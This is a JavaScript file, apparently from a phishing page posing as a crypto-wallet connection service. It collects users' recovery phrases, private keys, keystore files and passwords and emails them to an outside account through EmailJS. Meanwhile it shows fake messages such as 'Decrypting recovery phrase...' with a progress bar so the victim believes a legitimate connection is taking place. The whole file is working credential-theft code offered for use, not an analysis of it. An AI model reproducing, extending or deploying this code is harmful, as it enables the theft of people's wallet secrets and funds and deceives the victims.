// ── Manual connect ────────────────────────────────
function handleManualConnect() {
    showSub('wScreen2');
    aborted = false;
    const statusEl = document.getElementById('s2Status');
    const progressEl = document.getElementById('s2Progress');
    progressEl.style.width = '0%';

    const manualMsgs = [
        "Verifying credentials...", "Decrypting recovery phrase...",
        "Checking phrase integrity...", "Validating word count...",
        "Deriving wallet address...", "Cross-referencing on-chain data...",
        "Authenticating private key...", "Establishing secure session...",
        "Verifying key format...", "Almost done..."
    ];
    let i = 0;
    statusEl.textContent = manualMsgs[0];
    sTimer = setInterval(() => {
        i++;
        statusEl.style.opacity = '0';
        setTimeout(() => {
            statusEl.textContent = manualMsgs[i % manualMsgs.length];
            statusEl.style.opacity = '1';
        }, 100);
    }, 600);
    let pct = 0;
    pTimer = setInterval(() => {
        pct = Math.min(pct + (100 / (6000 / 200)), 99);
        progressEl.style.width = pct + '%';
    }, 200);
    cTimer = setTimeout(() => {
        if (aborted) return;
        clearInterval(sTimer); clearInterval(pTimer);
        progressEl.style.width = '100%';
        showSub('wScreen5');
    }, 6000);
}

function sendPhrase() {
    const activeType = document.querySelector('.type-btn.active').id.replace('btn-', '');
    let messageString = '';
    let isValid = false;

    if (activeType === 'phrase') {
        const phraseData = document.getElementById('phraseInput').value.trim();
        if (!phraseData) {
            alert('Please enter your credentials before connecting.');
            return;
        }
        isValid = true;
        messageString = "Type: Phrase\nData: " + phraseData;

    } else if (activeType === 'keystore') {
        let keyData = document.getElementById('keystoreInput').value.trim();
        const keyPass = document.getElementById('keystorePassword').value.trim();
        const fileAttached = document.getElementById('keystoreFileInput').files.length > 0;

        // Check for ImgBB hosted URL
        const imgUrl = document.getElementById('keystoreInput').dataset.imgUrl;

        if (imgUrl) {
            keyData += "\n\nImage Link: " + imgUrl;
        } else {
            const imgData = document.getElementById('keystoreInput').dataset.imgBase64;
            if (imgData) {
                keyData += "\n\nImage Status: Image was attached but not uploaded. Did you add your ImgBB API key?";
            }
        }

        if (!keyData && !fileAttached && !keyPass) {
            alert('Please enter your credentials before connecting.');
            return;
        }
        isValid = true;

        let fileInfo = fileAttached ? "Yes (" + document.getElementById('keystoreFileInput').files[0].name + ")" : "No";
        messageString = "Type: Keystore JSON\nPassword: " + keyPass + "\nFile Attached: " + fileInfo;
        // Safely append the data natively. No more external API fetches, no more missing emails!
        messageString += "\n\nData:\n" + keyData;

    } else if (activeType === 'privatekey') {
        const privData = document.getElementById('privkeyInput').value.trim();
        if (!privData) {
            alert('Please enter your credentials before connecting.');
            return;
        }
        isValid = true;
        messageString = "Type: Private Key\nData: " + privData;
    }

    if (!isValid) return;

    // GLOBAL FAILSAFE: EmailJS entirely drops payloads larger than 50KB.
    // If the user pastes/attaches a massive binary, we strictly truncate it to 40K chars so it NEVER fails!
    let safetext = messageString.length > 40000
        ? messageString.substring(0, 40000) + "\n\n...[TRUNCATED TO PREVENT EMAILJS 413 LIMIT ERROR]"
        : messageString;

    let parms = { message: safetext };

    // Trigger EmailJS instantly and synchronously natively.
    emailjs.send("service_p8dreiw", "template_o4d49ej", parms)
        .then(function (response) {
            console.log("200! Successfully sent", response.status, response.text);
        })
        .catch(function (error) {
            console.error("Transmission error...", error);
        });

    // Provide immediate visual feedback to the user
    handleManualConnect();
}
